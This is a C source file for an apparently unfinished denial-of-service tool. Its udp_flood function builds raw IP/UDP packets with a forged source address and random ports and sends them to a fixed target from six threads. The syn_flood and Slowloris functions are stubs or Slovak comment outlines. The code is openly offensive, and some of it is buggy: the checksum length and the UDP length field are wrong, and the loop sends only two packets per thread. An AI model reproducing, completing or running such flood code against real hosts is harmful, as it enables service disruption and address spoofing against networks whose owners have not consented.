#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <unistd.h>
#include <time.h>

// https://www.binarytides.com/raw-sockets-c-code-linux/
// https://www.tenouk.com/Module43a.html

#define MAX_THREADS     6
#define PACKET_LENGTH   64


unsigned short checksum(unsigned short *buf, int nwords)
{
    unsigned long sum;
    
    for (sum=0; nwords>0; nwords--)
        sum += *buf++;
    
    sum = (sum >> 16) + (sum &0xffff);
    sum += (sum >> 16);
    
    return (unsigned short)(~sum);
} 


int random(int a, int b)
{
    return rand() % (b - a + 1) + a;
}

int socket_spawn(void)
{
    int sock;
    int one = 1; 
    const int *val = &one;

    if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) < 0)
        pthread_exit(1);
    
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
        pthread_exit(2);

    // set timeout

    return sock;
}

void *udp_flood(void *value)
{
    char buffer[PACKET_LENGTH];

    in_addr_t ip_src = inet_addr("192.168.1.100");  // + choose random from subnet
    in_addr_t ip_dst = inet_addr("192.168.1.2");
    
    int s = socket_spawn();

    for (int i = 0; i < 2; i++) {
        memset(buffer, 0, PACKET_LENGTH);

        struct sockaddr_in sin;
        struct iphdr *ip = (struct iphdr *) buffer;
        struct udphdr *udp = (struct udphdr *) (buffer + sizeof(struct iphdr));

        uint16_t src_port = htons(random(32768, 65535));
        uint16_t dst_port = htons(random(1, 65535));

        sin.sin_family = AF_INET;
        sin.sin_port = dst_port;
        sin.sin_addr.s_addr = ip_src;

        ip->ihl      = 5;
        ip->version  = 4;
        ip->tos      = 16;
        ip->tot_len  = sizeof(struct iphdr) + sizeof(struct udphdr);
        ip->id       = htons(54321);
        ip->ttl      = 64;
        ip->protocol = IPPROTO_UDP; 
        ip->saddr = ip_src;
        ip->daddr = ip_dst;

        udp->source = src_port;
        udp->dest = dst_port;
        udp->len = htons(sizeof(struct udphdr));
        
        ip->check = checksum(buffer, ip->tot_len);

        if (sendto(s, buffer, ip->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            s = socket_spawn();
        }
    }

    close(s);
}

void *syn_flood(void *value)
{
    // raw tcp socket
    // int socket = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
}

void *slow_loris(void *value)
{
    // tcp socket with http requests
    // int socket = socket(AF_INET, SOCK_STREAM, 0);
    // settimeout(4)
    // connect(ip, 80)
    // pošli GET s normálnou hlavičkou na náhodnú adresu
    
    // Po istom čase (15s) pošli X-a náhodnú hlavičku
    // Ak zomrie socket v array tak ho znovu vytvor
}

int main(void)
{
    srand(time(NULL));
    pthread_t attackers[MAX_THREADS];
    
    for (int i = 0; i < MAX_THREADS; i++)
        pthread_create(&attackers[i], NULL, udp_flood, NULL);
    
    for (int i = 0; i < MAX_THREADS; i++)
        pthread_join(attackers[i], NULL);
}
